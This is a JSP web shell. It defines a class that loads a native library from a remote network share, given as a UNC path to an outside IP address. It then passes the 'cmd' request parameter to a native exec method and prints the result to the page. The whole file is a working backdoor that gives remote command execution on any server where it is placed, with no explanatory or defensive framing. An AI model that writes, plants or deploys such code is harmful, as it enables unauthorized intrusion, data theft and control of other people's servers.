
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
  class JniClass {
    public native String exec(String string);
    public JniClass() {
      //System.load("/Users/nano/IdeaProjects/untitled1/target/classes/libJniClass.jnilib");
      System.load("\\\\8.8.8.8\\classes\\1.dll");
    }
  }
  ;
%>
<%
  String cmd  = request.getParameter("cmd");
  JniClass jniClass = new JniClass();
  String res = jniClass.exec(cmd);
%>

<%=res%>




